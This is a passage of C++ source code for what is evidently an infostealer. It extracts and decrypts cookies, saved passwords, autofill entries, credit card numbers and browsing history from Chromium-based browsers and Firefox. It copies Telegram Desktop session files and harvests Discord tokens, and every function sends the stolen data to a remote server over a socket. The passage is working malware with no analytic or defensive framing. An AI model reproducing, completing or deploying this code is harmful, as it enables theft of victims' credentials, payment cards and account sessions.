                int blob_size = sqlite3_column_bytes(stmt, 3);
                const char* path = (const char*)sqlite3_column_text(stmt, 4); long long expires = sqlite3_column_int64(stmt, 5);
                int secure = sqlite3_column_int(stmt, 6); int httponly = sqlite3_column_int(stmt, 7);

                std::vector<uint8_t> dec = decrypt_blob(std::vector<uint8_t>(blob_ptr, blob_ptr + blob_size), v10_key, v20_key, is_opera);
                std::string cookie_val = !dec.empty() ? std::string(dec.begin(), dec.end()) : (value ? value : "");
                if (!cookie_val.empty()) {
                    std::string str_name = name ? name : "";
                    std::string str_host = host ? host : "";
                    std::string str_path = path ? path : "";
                    oss_txt << str_name << "=" << cookie_val << "\n";
                    if (!first) oss_json << ",\n";
                    oss_json << "  {\n";
                    oss_json << "    \"name\": \"" << json_escape(str_name) << "\",\n";
                    oss_json << "    \"value\": \"" << json_escape(cookie_val) << "\",\n";
                    oss_json << "    \"domain\": \"" << json_escape(str_host) << "\",\n";
                    oss_json << "    \"path\": \"" << json_escape(str_path) << "\",\n";
                    oss_json << "    \"expires\": " << expires << ",\n";
                    oss_json << "    \"secure\": " << (secure ? "true" : "false") << ",\n";
                    oss_json << "    \"httpOnly\": " << (httponly ? "true" : "false") << "\n";
                    oss_json << "  }";
                    first = false;
                }
            }
            oss_json << "\n]";
            sqlite3_finalize(stmt);
            std::string str_txt = oss_txt.str(); if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/cookies.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
            std::string str_json = oss_json.str(); if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/cookies.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
        }
        sqlite3_close(db);
    }
}

void extract_autofill(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, bool is_opera) {
    std::vector<std::string> db_names = {"Web Data", "Ya Autofill Data", "Ya Credit Cards"};
    std::ostringstream oss_txt, oss_json;
    oss_json << "[\n"; bool first = true;
    for (const auto& db_name : db_names) {
        fs::path db_path = profile_path / db_name; if (!fs::exists(db_path)) continue;
        std::string uri = path_to_uri(db_path); sqlite3* db;
        if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
            sqlite3_stmt* stmt;
            if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, &stmt, NULL) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    const char* name = (const char*)sqlite3_column_text(stmt, 0); const char* value = (const char*)sqlite3_column_text(stmt, 1);
                    std::string str_name = name ? name : ""; std::string str_val = value ? value : "";
                    oss_txt << "Form: " << str_name << " = " << str_val << "\n";
                    if (!first) oss_json << ",\n";
                    oss_json << "  {\n";
                    oss_json << "    \"type\": \"form\",\n";
                    oss_json << "    \"name\": \"" << json_escape(str_name) << "\",\n";
                    oss_json << "    \"value\": \"" << json_escape(str_val) << "\"\n";
                    oss_json << "  }";
                    first = false;
                }
                sqlite3_finalize(stmt);
            }
            const char* tables[] = {"autofill_profile_names", "autofill_profile_emails", "autofill_profile_phones"};
            for (const char* table : tables) {
                std::string col = strstr(table, "name") ? "first_name" : (strstr(table, "email") ? "email" : "number");
                std::string sql = "SELECT guid, " + col + " FROM " + table;
                if (sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        const char* guid = (const char*)sqlite3_column_text(stmt, 0); const char* val = (const char*)sqlite3_column_text(stmt, 1);
                        std::string str_guid = guid ? guid : ""; std::string str_val = val ? val : "";
                        oss_txt << table << " (" << str_guid << "): " << str_val << "\n";
                        if (!first) oss_json << ",\n";
                        oss_json << "  {\n";
                        oss_json << "    \"type\": \"" << json_escape(table) << "\",\n";
                        oss_json << "    \"guid\": \"" << json_escape(str_guid) << "\",\n";
                        oss_json << "    \"value\": \"" << json_escape(str_val) << "\"\n";
                        oss_json << "  }";
                        first = false;
                    }
                    sqlite3_finalize(stmt);
                }
            }
            if (sqlite3_prepare_v2(db, "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", -1, &stmt, NULL) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    const char* name = (const char*)sqlite3_column_text(stmt, 0); int m = sqlite3_column_int(stmt, 1); int y = sqlite3_column_int(stmt, 2);
                    const uint8_t* blob_ptr = (const uint8_t*)sqlite3_column_blob(stmt, 3); int blob_size = sqlite3_column_bytes(stmt, 3);
                    std::vector<uint8_t> dec = decrypt_blob(std::vector<uint8_t>(blob_ptr, blob_ptr + blob_size), v10_key, v20_key, is_opera);
                    if (!dec.empty()) {
                        std::string str_name = name ? name : ""; std::string str_num = std::string(dec.begin(), dec.end());
                        oss_txt << "Card: " << str_name << " | Exp: " << m << "/" << y << " | Num: " << str_num << "\n";
                        if (!first) oss_json << ",\n";
                        oss_json << "  {\n";
                        oss_json << "    \"type\": \"card\",\n";
                        oss_json << "    \"name\": \"" << json_escape(str_name) << "\",\n";
                        oss_json << "    \"expiry\": \"" << m << "/" << y << "\",\n";
                        oss_json << "    \"number\": \"" << json_escape(str_num) << "\"\n";
                        oss_json << "  }";
                        first = false;
                    }
                }
                sqlite3_finalize(stmt);
            }
            sqlite3_close(db);
        }
    }
    oss_json << "\n]";
    std::string str_txt = oss_txt.str(); if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/autofill.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
    std::string str_json = oss_json.str(); if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/autofill.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
}

void extract_history(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix) {
    fs::path db_path = profile_path / "History"; if (!fs::exists(db_path)) return;
    std::string uri = path_to_uri(db_path); sqlite3* db;
    if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
        sqlite3_stmt* stmt; const char* sql = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100";
        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
            std::ostringstream oss_txt, oss_json;
            oss_json << "[\n"; bool first = true;
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* url = (const char*)sqlite3_column_text(stmt, 0); const char* title = (const char*)sqlite3_column_text(stmt, 1); int count = sqlite3_column_int(stmt, 2);
                long long last_visit = sqlite3_column_int64(stmt, 3);
                std::string str_url = url ? url : ""; std::string str_title = title ? title : "";
                oss_txt << "URL: " << str_url << " | Title: " << str_title << " | Visits: " << count << "\n";
                if (!first) oss_json << ",\n";
                oss_json << "  {\n";
                oss_json << "    \"url\": \"" << json_escape(str_url) << "\",\n";
                oss_json << "    \"title\": \"" << json_escape(str_title) << "\",\n";
                oss_json << "    \"visit_count\": " << count << ",\n";
                oss_json << "    \"last_visit_time\": " << last_visit << "\n";
                oss_json << "  }";
                first = false;
            }
            oss_json << "\n]";
            sqlite3_finalize(stmt);
            std::string str_txt = oss_txt.str(); if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/history.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
            std::string str_json = oss_json.str(); if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/history.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
        }
        sqlite3_close(db);
    }
}

void extract_all_profiles_data(SOCKET sock, const std::vector<uint8_t>& v20_key, const BrowserConfig& config, const std::wstring& user_data_dir) {
    std::vector<uint8_t> v10_key; bool is_dpapi = false; get_v10_key(user_data_dir, v10_key, is_dpapi);
    fs::path user_data(user_data_dir); bool is_opera = config.name.find("Opera") != std::string::npos || config.name.find("Yandex") != std::string::npos;
    for (const auto& entry : fs::directory_iterator(user_data)) {
        if (entry.is_directory()) {
            if (fs::exists(entry.path() / "Preferences") || fs::exists(entry.path() / "Cookies") || fs::exists(entry.path() / "Network" / "Cookies") || fs::exists(entry.path() / "Ya Passman Data")) {
                std::string profile_name = entry.path().filename().string();
                std::string out_prefix = config.output_dir + "/" + profile_name;
                extract_passwords(sock, entry.path(), out_prefix, v10_key, v20_key, is_opera);
                extract_cookies(sock, entry.path(), out_prefix, v10_key, v20_key, is_opera);
                extract_autofill(sock, entry.path(), out_prefix, v10_key, v20_key, is_opera);
                extract_history(sock, entry.path(), out_prefix);
            }
        }
    }
}

void extract_firefox_cookies(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix) {
    fs::path db_path = profile_path / "cookies.sqlite"; if (!fs::exists(db_path)) return;
    std::string uri = path_to_uri(db_path); sqlite3* db;
    if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
        sqlite3_stmt* stmt; const char* sql = "SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies";
        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
            std::ostringstream oss_txt, oss_json;
            oss_json << "[\n"; bool first = true;
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* host = (const char*)sqlite3_column_text(stmt, 0); const char* name = (const char*)sqlite3_column_text(stmt, 1);
                const char* value = (const char*)sqlite3_column_text(stmt, 2); const char* path = (const char*)sqlite3_column_text(stmt, 3);
                long long expiry = sqlite3_column_int64(stmt, 4); int secure = sqlite3_column_int(stmt, 5); int httponly = sqlite3_column_int(stmt, 6);

                std::string str_name = name ? name : ""; std::string str_val = value ? value : "";
                std::string str_host = host ? host : ""; std::string str_path = path ? path : "";
                oss_txt << str_name << "=" << str_val << "\n";
                if (!first) oss_json << ",\n";
                oss_json << "  {\n";
                oss_json << "    \"name\": \"" << json_escape(str_name) << "\",\n";
                oss_json << "    \"value\": \"" << json_escape(str_val) << "\",\n";
                oss_json << "    \"domain\": \"" << json_escape(str_host) << "\",\n";
                oss_json << "    \"path\": \"" << json_escape(str_path) << "\",\n";
                oss_json << "    \"expires\": " << expiry << ",\n";
                oss_json << "    \"secure\": " << (secure ? "true" : "false") << ",\n";
                oss_json << "    \"httpOnly\": " << (httponly ? "true" : "false") << "\n";
                oss_json << "  }";
                first = false;
            }
            oss_json << "\n]";
            sqlite3_finalize(stmt);
            std::string str_txt = oss_txt.str(); if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/cookies.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
            std::string str_json = oss_json.str(); if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/cookies.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
        }
        sqlite3_close(db);
    }
}

void extract_firefox_history(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix) {
    fs::path db_path = profile_path / "places.sqlite"; if (!fs::exists(db_path)) return;
    std::string uri = path_to_uri(db_path); sqlite3* db;
    if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
        sqlite3_stmt* stmt; const char* sql = "SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 100";
        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
            std::ostringstream oss_txt, oss_json;
            oss_json << "[\n"; bool first = true;
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* url = (const char*)sqlite3_column_text(stmt, 0); const char* title = (const char*)sqlite3_column_text(stmt, 1); int count = sqlite3_column_int(stmt, 2);
                long long last_visit = sqlite3_column_int64(stmt, 3);
                std::string str_url = url ? url : ""; std::string str_title = title ? title : "";
                oss_txt << "URL: " << str_url << " | Title: " << str_title << " | Visits: " << count << "\n";
                if (!first) oss_json << ",\n";
                oss_json << "  {\n";
                oss_json << "    \"url\": \"" << json_escape(str_url) << "\",\n";
                oss_json << "    \"title\": \"" << json_escape(str_title) << "\",\n";
                oss_json << "    \"visit_count\": " << count << ",\n";
                oss_json << "    \"last_visit_date\": " << last_visit << "\n";
                oss_json << "  }";
                first = false;
            }
            oss_json << "\n]";
            sqlite3_finalize(stmt);
            std::string str_txt = oss_txt.str(); if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/history.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
            std::string str_json = oss_json.str(); if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/history.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
        }
        sqlite3_close(db);
    }
}

void extract_firefox_autofill(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix) {
    fs::path db_path = profile_path / "formhistory.sqlite"; if (!fs::exists(db_path)) return;
    std::string uri = path_to_uri(db_path); sqlite3* db;
    if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
        sqlite3_stmt* stmt; const char* sql = "SELECT fieldname, value FROM moz_formhistory";
        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
            std::ostringstream oss_txt, oss_json;
            oss_json << "[\n"; bool first = true;
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* name = (const char*)sqlite3_column_text(stmt, 0); const char* value = (const char*)sqlite3_column_text(stmt, 1);
                std::string str_name = name ? name : ""; std::string str_val = value ? value : "";
                oss_txt << "Field: " << str_name << " = " << str_val << "\n";
                if (!first) oss_json << ",\n";
                oss_json << "  {\n";
                oss_json << "    \"name\": \"" << json_escape(str_name) << "\",\n";
                oss_json << "    \"value\": \"" << json_escape(str_val) << "\"\n";
                oss_json << "  }";
                first = false;
            }
            oss_json << "\n]";
            sqlite3_finalize(stmt);
            std::string str_txt = oss_txt.str(); if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/autofill.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
            std::string str_json = oss_json.str(); if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/autofill.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
        }
        sqlite3_close(db);
    }
}

typedef enum { SECSuccess = 0, SECFailure = -1 } SECStatus;
typedef struct SECItemStr { int type; unsigned char *data; unsigned int len; } SECItem;
typedef SECStatus (*PK11_AuthenticatePtr)(void *slot, int load_tokens, void *wincxt);
typedef void *(*PK11_GetInternalKeySlotPtr)();
typedef void (*PK11_FreeSlotPtr)(void *slot);
typedef SECStatus (*NSS_InitPtr)(const char *configdir);
typedef SECStatus (*NSS_ShutdownPtr)();
typedef SECStatus (*PK11SDR_DecryptPtr)(SECItem *data, SECItem *result, void *cx);
struct NSS_Functions { HMODULE h_nss; NSS_InitPtr NSS_Init; NSS_ShutdownPtr NSS_Shutdown; PK11_GetInternalKeySlotPtr PK11_GetInternalKeySlot; PK11_FreeSlotPtr PK11_FreeSlot; PK11_AuthenticatePtr PK11_Authenticate; PK11SDR_DecryptPtr PK11SDR_Decrypt; };

bool load_nss(const fs::path& nss_path, NSS_Functions& f) {
    SetDllDirectoryW(nss_path.wstring().c_str()); f.h_nss = LoadLibraryW((nss_path / "nss3.dll").wstring().c_str()); if (!f.h_nss) return false;
    f.NSS_Init = (NSS_InitPtr)GetProcAddress(f.h_nss, "NSS_Init"); f.NSS_Shutdown = (NSS_ShutdownPtr)GetProcAddress(f.h_nss, "NSS_Shutdown");
    f.PK11_GetInternalKeySlot = (PK11_GetInternalKeySlotPtr)GetProcAddress(f.h_nss, "PK11_GetInternalKeySlot"); f.PK11_FreeSlot = (PK11_FreeSlotPtr)GetProcAddress(f.h_nss, "PK11_FreeSlot");
    f.PK11_Authenticate = (PK11_AuthenticatePtr)GetProcAddress(f.h_nss, "PK11_Authenticate"); f.PK11SDR_Decrypt = (PK11SDR_DecryptPtr)GetProcAddress(f.h_nss, "PK11SDR_Decrypt");
    return f.NSS_Init && f.NSS_Shutdown && f.PK11_GetInternalKeySlot && f.PK11_FreeSlot && f.PK11_Authenticate && f.PK11SDR_Decrypt;
}

void extract_firefox_passwords(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix, const fs::path& nss_dir) {
    NSS_Functions nss; if (!load_nss(nss_dir, nss)) return;
    if (nss.NSS_Init(profile_path.string().c_str()) == SECSuccess) {
        void* slot = nss.PK11_GetInternalKeySlot();
        if (slot) {
            if (nss.PK11_Authenticate(slot, TRUE, NULL) == SECSuccess) {
                fs::path logins_path = profile_path / "logins.json"; std::ifstream ifs(logins_path);
                if (ifs.is_open()) {
                    std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
                    std::ostringstream oss_txt, oss_json;
                    oss_json << "[\n"; bool first = true;
                    size_t pos = 0;
                    while ((pos = content.find("\"hostname\":\"", pos)) != std::string::npos) {
                        pos += 12; size_t end = content.find("\"", pos); std::string host = content.substr(pos, end - pos);
                        pos = content.find("\"encryptedUsername\":\"", pos); pos += 21; end = content.find("\"", pos); std::string enc_user = content.substr(pos, end - pos);
                        pos = content.find("\"encryptedPassword\":\"", pos); pos += 21; end = content.find("\"", pos); std::string enc_pass = content.substr(pos, end - pos);
                        auto user_data = base64_decode(enc_user); auto pass_data = base64_decode(enc_pass);
                        SECItem user_item = { 0, user_data.data(), (unsigned int)user_data.size() }; SECItem pass_item = { 0, pass_data.data(), (unsigned int)pass_data.size() };
                        SECItem dec_user = { 0, NULL, 0 }; SECItem dec_pass = { 0, NULL, 0 };
                        if (nss.PK11SDR_Decrypt(&user_item, &dec_user, NULL) == SECSuccess && nss.PK11SDR_Decrypt(&pass_item, &dec_pass, NULL) == SECSuccess) {
                            std::string str_user = std::string((char*)dec_user.data, dec_user.len);
                            std::string str_pass = std::string((char*)dec_pass.data, dec_pass.len);
                            oss_txt << "URL: " << host << "\nUser: " << str_user << "\nPass: " << str_pass << "\n---\n";
                            if (!first) oss_json << ",\n";
                            oss_json << "  {\n";
                            oss_json << "    \"url\": \"" << json_escape(host) << "\",\n";
                            oss_json << "    \"username\": \"" << json_escape(str_user) << "\",\n";
                            oss_json << "    \"password\": \"" << json_escape(str_pass) << "\"\n";
                            oss_json << "  }";
                            first = false;
                        }
                        pos = end;
                    }
                    oss_json << "\n]";
                    std::string str_txt = oss_txt.str(); if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/passwords.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
                    std::string str_json = oss_json.str(); if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/passwords.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
                }
            }
            nss.PK11_FreeSlot(slot);
        }
        nss.NSS_Shutdown();
    }
    FreeLibrary(nss.h_nss);
}

void extract_firefox_data(SOCKET sock, const BrowserConfig& config, const std::wstring& user_data_dir) {
    fs::path user_data(user_data_dir); fs::path nss_dir; std::vector<std::wstring> search_roots = get_search_roots();
    for (const auto& path : config.exe_paths) {
        for (const auto& root : search_roots) { fs::path full_path = fs::path(root) / path; if (fs::exists(full_path)) { nss_dir = full_path.parent_path(); break; } }
        if (!nss_dir.empty()) break;
    }
    for (const auto& entry : fs::directory_iterator(user_data)) {
        if (entry.is_directory()) {
            fs::path profile_path = entry.path(); if (fs::exists(profile_path / "cookies.sqlite") || fs::exists(profile_path / "logins.json")) {
                std::string profile_name = profile_path.filename().string(); std::string out_prefix = config.output_dir + "/" + profile_name;
                extract_firefox_cookies(sock, profile_path, out_prefix); extract_firefox_history(sock, profile_path, out_prefix); extract_firefox_autofill(sock, profile_path, out_prefix);
                if (!nss_dir.empty()) extract_firefox_passwords(sock, profile_path, out_prefix, nss_dir);
            }
        }
    }
}

void extract_telegram_session(SOCKET sock) {
    wchar_t* appdata; if (SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &appdata) != S_OK) return;
    fs::path tdata_path = fs::path(appdata) / L"Telegram Desktop" / L"tdata"; CoTaskMemFree(appdata);
    if (!fs::exists(tdata_path)) return;
    auto send_tdata_file = [&](const fs::path& src) {
        if (fs::exists(src)) {
            std::ifstream ifs(src, std::ios::binary); std::vector<uint8_t> data((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
            send_file_to_server(sock, "telegram session/tdata/" + src.filename().string(), data);
        }
    };
    for (const auto& f : {"key_datas", "map0", "map1", "settingss"}) send_tdata_file(tdata_path / f);
    for (const auto& entry : fs::directory_iterator(tdata_path)) {
        if (entry.is_directory()) {
            std::string folder_name = entry.path().filename().string();
            if (folder_name.length() == 16 && std::all_of(folder_name.begin(), folder_name.end(), [](unsigned char c) { return std::isxdigit(c); })) {
                for (const auto& sub_entry : fs::recursive_directory_iterator(entry.path())) {
                    if (!sub_entry.is_directory()) {
                        std::string filename = sub_entry.path().filename().string();
                        if (filename.find(".log") == std::string::npos && filename.find("dumps") == std::string::npos) {
                            std::ifstream ifs(sub_entry.path(), std::ios::binary); std::vector<uint8_t> data((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
                            send_file_to_server(sock, "telegram session/tdata/" + folder_name + "/" + fs::relative(sub_entry.path(), entry.path()).string(), data);
                        }
                    }
                }
            }
        }
    }
}

void extract_discord_tokens(SOCKET sock, const std::wstring& discord_path_w, const std::string& output_name) {
    fs::path discord_path(discord_path_w); if (!fs::exists(discord_path)) return;
    std::vector<uint8_t> master_key; bool is_dpapi; if (!get_v10_key(discord_path_w, master_key, is_dpapi)) return;
    fs::path leveldb_path = discord_path / "Local Storage" / "leveldb"; if (!fs::exists(leveldb_path)) return;
    std::set<std::string> tokens; std::regex enc_regex("dQw4w9WgXcQ:([^\"\\s\\x00-\\x1F]+)"); std::regex plain_regex("[a-zA-Z0-9_-]{24,28}\\.[a-zA-Z0-9_-]{6}\\.[a-zA-Z0-9_-]{25,110}");
    for (const auto& entry : fs::directory_iterator(leveldb_path)) {
        std::string ext = entry.path().extension().string(); if (ext == ".log" || ext == ".ldb") {
            std::ifstream ifs(entry.path(), std::ios::binary);
            if (ifs) {
                std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
                for (auto i = std::sregex_iterator(content.begin(), content.end(), enc_regex); i != std::sregex_iterator(); ++i) {
                    std::string enc_val = (*i)[1].str(); if (!enc_val.empty() && enc_val.back() == '\\') enc_val.pop_back();
                    std::vector<uint8_t> enc_bytes = base64_decode(enc_val); if (!enc_bytes.empty()) {
                        std::vector<uint8_t> dec = decrypt_blob(enc_bytes, master_key, {}, false); if (!dec.empty()) tokens.insert(std::string(dec.begin(), dec.end()));
                    }
                }
                for (auto i = std::sregex_iterator(content.begin(), content.end(), plain_regex); i != std::sregex_iterator(); ++i) tokens.insert((*i).str());
            }
        }
    }
    if (!tokens.empty()) {
        std::ostringstream oss_txt, oss_json;
        oss_json << "[\n"; bool first = true;
        for (const auto& token : tokens) {
            oss_txt << token << "\n";
            if (!first) oss_json << ",\n";
            oss_json << "  \"" << json_escape(token) << "\"";
            first = false;
        }
        oss_json << "\n]";
        std::string str_txt = oss_txt.str(); send_file_to_server(sock, "discord/" + output_name + "/tokens.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
        std::string str_json = oss_json.str(); send_file_to_server(sock, "discord/" + output_name + "/tokens.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
    }
}
